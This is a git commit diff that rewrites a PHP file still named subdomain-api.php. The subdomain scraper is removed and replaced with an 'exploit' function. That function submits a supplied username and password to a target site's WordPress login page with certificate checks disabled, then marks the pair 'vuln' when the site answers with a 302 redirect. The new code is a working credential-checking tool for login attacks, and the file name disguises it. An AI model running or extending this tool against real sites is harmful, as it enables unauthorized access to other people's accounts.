3658b1cf5dcc983f67dd2f49efaae7d7cfa07642
Dmz Hari <45622512+dmzhari@users.noreply.github.com>
2021-04-04 20:40:57 +0700

    Update subdomain-api.php

--- subdomain-api.php
+++ subdomain-api.php
@@ -1,35 +1,50 @@
 <?php
 
 header('Content-type: application/json');
-ob_flush();
-clearstatcache();
-// include '../random-useragent.php';
-function curl($url)
+function exploit($url, $user, $pass)
 {
-    $setopt = array(
-        CURLOPT_URL             => 'https://osint.sh/subdomain/',
-        CURLOPT_RETURNTRANSFER  => true,
-        CURLOPT_POST            => true,
-        CURLOPT_POSTFIELDS      => "domain=$url",
-        CURLOPT_USERAGENT       => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
-        CURLOPT_TIMEOUT         => 60,
-        CURLOPT_CONNECTTIMEOUT  => 60
-    );
-    $ch = curl_init();
-    curl_setopt_array($ch, $setopt);
-    $exe = curl_exec($ch);
-    curl_close($ch);
-    return $exe;
+	$setopt = array(
+		CURLOPT_URL => $url . '/wp-login.php',
+		CURLOPT_RETURNTRANSFER => true,
+		CURLOPT_POSTFIELDS => "log=$user&pwd=$pass&wp-submit=LogIn&redirect_to=$url/wp-admin/",
+		CURLOPT_TIMEOUT => 60,
+		CURLOPT_CONNECTTIMEOUT => 60,
+		CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5',
+		CURLOPT_SSL_VERIFYHOST => false,
+		CURLOPT_SSL_VERIFYPEER => false,
+	);
+	$ch = curl_init();
+	curl_setopt_array($ch, $setopt);
+	$exe = curl_exec($ch);
+	$info = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+	curl_close($ch);
+	return $info;
 }
-if (!empty($_GET['domain'])) {
-    $domain = htmlspecialchars($_GET['domain']);
-    $subdomain = curl($domain);
-    $scrap = preg_match_all("/<a href=\"https:\/\/(.*?)\"/i", $subdomain, $subdo);
-    $rep = array_unique(array_filter(preg_replace("#twitter.com/secgron|teguh.co/|www.linkedin.com/in/secgron|fb.me/secgron|fb.me/secgron|github.com/secgron#", '', $subdo[1])));
-    $api['status'] = http_response_code();
-    $api['result'] = $rep;
-    echo json_encode($api, JSON_PRETTY_PRINT);
-} else {
-    $api['error'] = 'Not Found';
-    echo json_encode($api, JSON_PRETTY_PRINT);
+if (!empty($_GET['site']) && !empty($_GET['user']) && !empty($_GET['pass'])) {
+	$site = htmlspecialchars($_GET['site']);
+	$user = htmlspecialchars($_GET['user']);
+	$pass = htmlspecialchars($_GET['pass']);
+	if (!preg_match('#^http(s)?://#', $site)) {
+		$url = "http://" . $site;
+	} else {
+		$url = $site;
+	}
+	$exploit = exploit($url, $user, $pass);
+	if ($exploit == 302) {
+		$api['url'] = $url;
+		$api['user'] = $user;
+		$api['pass'] = $pass;
+		$api['exploit'] = 'vuln';
+		echo json_encode($api, JSON_PRETTY_PRINT);
+	} else {
+		$api['url'] = $url;
+		$api['exploit'] = 'failed';
+		echo json_encode($api, JSON_PRETTY_PRINT);
+	}
+} else if (empty($_GET['site'])) {
+	echo 'Site Empty';
+} else if (empty($_GET['user'])) {
+	echo 'User Empty';
+} else if (empty($_GET['pass'])) {
+	echo 'Pass Empty';
 }
